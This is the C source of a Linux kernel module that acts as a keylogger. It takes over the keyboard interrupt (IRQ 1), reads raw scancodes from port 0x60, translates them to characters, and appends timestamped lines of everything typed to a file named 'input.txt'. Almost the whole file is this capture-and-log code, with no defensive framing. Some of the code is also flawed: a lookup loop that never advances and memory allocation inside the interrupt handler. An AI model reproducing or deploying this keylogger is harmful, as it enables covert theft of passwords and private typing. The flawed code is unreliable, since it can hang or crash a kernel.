#include <linux/kernel.h> /* We're doing kernel work */
#include <linux/module.h> /* Specifically, a module */
#include <linux/sched.h>
#include <linux/workqueue.h>
#include <linux/interrupt.h> /* We want an interrupt */
#include <asm/io.h>
#include <linux/slab.h>
#include <linux/fs.h> 
#define MY_WORK_QUEUE_NAME "WQsched.c"

#define SIZE 200

//Defining Map for scancode
struct DataItem {
   char* data;   
   int key;
};

struct DataItem* hashArray[SIZE]; 
struct DataItem* item;
struct file *logFile;
struct timespec64 now;
struct tm tm_now;


static char time[11];
static char* keyBuffer[128];
static char* newLine = "\n";
int indx=0;
bool capsUp = false;
bool shift = false;

static struct workqueue_struct *my_workqueue;
typedef struct {
	struct work_struct my_work;
	int scancode;
} my_work_t;  
my_work_t *work, *myWork;


//static char keyBuffer[128];(0-9,a-Z,L/R Shift-interpret (instead of log) SHIFT
int hashCode(int key) {
   return key;
}

struct DataItem *search(int key) {
   //get the hash 
   int hashIndex = hashCode(key);  
	
   //move in array until an empty 
   while(hashArray[hashIndex] != NULL) {
	
      if(hashArray[hashIndex]->key == key)
         return hashArray[hashIndex]; 
   }        
	
   return NULL;        
}

void insert(int key,char* data) {
	int hashIndex;

	struct DataItem *item = (struct DataItem*) kmalloc(sizeof(struct DataItem), GFP_KERNEL);
	item->data = data;  
	item->key = key;

	//get the hash 
	hashIndex = hashCode(key);
	
	hashArray[hashIndex] = item;	
}

void main(void) {
	insert(1, "ESC");insert(102, "!");insert(103, "@");insert(104, "#");insert(105, "$");insert(106, "%");insert(107, "^");insert(108, "&");insert(109, "*");insert(110, "("); insert(111, ")");insert(112, "_");insert(113, "+");insert(2, "1");insert(3, "2");insert(4, "3");insert(5, "4");insert(6, "5");insert(7, "6");insert(8, "7");insert(9, "8");insert(10, "9");insert(11, "0");insert(12, "-");insert(13, "=");insert(14, "bs");insert(15, "Tab");insert(116, "Q");insert(117, "W");insert(118, "E");insert(119, "R");insert(120, "T");insert(121, "Y");insert(122, "U");insert(123, "I");insert(124, "O");insert(125, "P");insert(126, "{");insert(127, "}");insert(16, "q");insert(17, "w");insert(18, "e");insert(19, "r");insert(20, "t");insert(21, "y");insert(22, "u");insert(23, "i");insert(24, "o");insert(25, "p");insert(26, "[");insert(27, "]");insert(28, "Enter");insert(29, "CTRL");insert(130, "A");insert(131, "S");insert(132, "D");insert(133, "F");insert(134, "G");insert(135, "H");insert(136, "J");insert(137, "K");insert(138, "L");insert(139, ":");insert(140, "\"");insert(141, "~");insert(30, "a");insert(31, "s");insert(32, "d");insert(33, "f");insert(34, "g");insert(35, "h");insert(36, "j");insert(37, "k");insert(38, "l");insert(39, ";");insert(40, "'");insert(41, "`");insert(42, "LShift");insert(143, "|");insert(43, "\\");insert(144, "Z");insert(145, "X");insert(146, "C");insert(147, "V");insert(148, "B");insert(149, "N");insert(150, "M");insert(151, "<");insert(152, ">");insert(153, "?");insert(44, "z");insert(45, "x");insert(46, "c");insert(47, "v");insert(48, "b");insert(49, "n");insert(50, "m");insert(51, ",");insert(52, ".");insert(53, "/");insert(54, "RShift");insert(55, "PrtSc");insert(56, "Alt");insert(57, "Space");insert(58, "Caps");insert(59, "F1");insert(60, "F2");insert(61, "F3");insert(62, "F4");insert(63, "F5");insert(64, "F6");insert(65, "F7");insert(66, "F8");insert(67, "F9");insert(68, "F10");insert(69, "Num");insert(70, "Scroll");insert(71, "Home"); insert(72, "Up");insert(73, "PgUp"); insert(74, "-");insert(75, "Left"); insert(76, "Center");insert(77, "Right"); insert(78, "+");insert(79, "End");insert(80, "Down");insert(81, "PgDn");insert(82, "Ins");insert(83, "Del");
}

static void got_char(struct work_struct *w) {
	int sc;
	//buffered the line until you receive a return key or it's full keybuffer[128]
	myWork = (my_work_t *)w;
	sc=myWork->scancode;
	if (!(sc & 0x80)) {
		if (search(sc & 0x7F) != NULL) {
			char* output;
			if ((sc & 0x7F) == 58) {
				capsUp = (capsUp == false) ? true : false;
				return;
			} else if ((sc & 0x7F) == 42 || (sc & 0x7F) == 54) {
				shift = true;
				return;
			}
			
			if (capsUp == true) {
				if (shift == true)
					output = search(sc & 0x7F)->data;
				else {
					if (search((sc & 0x7F)+100) == NULL)
						output = search(sc & 0x7F)->data;
					else
						output = search((sc & 0x7F)+100)->data;
				}
			} else if (shift == true) {
				if (capsUp == true)
					output = search(sc & 0x7F)->data;
				else {
					if (search((sc & 0x7F)+100) == NULL)
						output = search(sc & 0x7F)->data;
					else
						output = search((sc & 0x7F)+100)->data;
				}
			} else
				output = search(sc & 0x7F)->data;

			if ((indx >= 128 || (sc & 0x7F) == 28) && !IS_ERR(logFile)) {
				
				ktime_get_real_ts64(&now);
				time64_to_tm(now.tv_sec, 0, &tm_now);
				long hour = (now.tv_sec/3600)%24;
				long min = (now.tv_sec/60)%60;
				long sec = (now.tv_sec%60)%60;
				hour = (hour>=0 && hour<8) ? hour + 4 : hour - 8;
				sprintf(time, "%ld:%ld:%ld: ",hour,min,sec);

				int prev = indx;
				indx = 0;
				static loff_t pos = 0;
//				printk("loop starts\n");
				while (indx < prev) {
//					printk(KERN_CONT "%s", keyBuffer[indx]);
					if (indx == 0) {
 						kernel_write(logFile, (void *)time, strlen(time), &pos);
						pos += strlen(time);						
					}
					kernel_write(logFile, (void *)keyBuffer[indx], strlen(keyBuffer[indx]), &pos);
					pos += strlen(keyBuffer[indx]);
					indx++;
				}
				kernel_write(logFile, (void *)newLine, strlen(newLine), &pos);
				
//				printk("loop ends\n");
				indx = 0;
			}
			if ((sc & 0x7F) != 28)	
				keyBuffer[indx++] = output;
		} else
			printk("The number is : %d",sc & 0x7F);
	} else if ((sc & 0x80) && ((sc & 0x7F) == 42 || (sc & 0x7F) == 54))
		shift = false;

}
irqreturn_t irq_handler(int irq, void *unknown) {
	static unsigned char character;
	character = inb(0x60);

	work = (my_work_t *)kmalloc(sizeof(my_work_t), GFP_KERNEL);
	if (work) {
		work->scancode = character;
		INIT_WORK((struct work_struct *)work, got_char);
		queue_work(my_workqueue, (struct work_struct *)work );
	}    
    return IRQ_HANDLED;
}

int init_module() {
	main();
	logFile = filp_open("input.txt",O_WRONLY | O_CREAT | O_APPEND, 0777);

	my_workqueue = create_workqueue(MY_WORK_QUEUE_NAME);
	free_irq(1, NULL);
	return request_irq(1, irq_handler, IRQF_SHARED, "test_keyboard_irq_handler", (void *)(irq_handler));
}
       
void cleanup_module() {
	filp_close(logFile, NULL);
	free_irq(1, NULL);
}

MODULE_LICENSE("GPL");
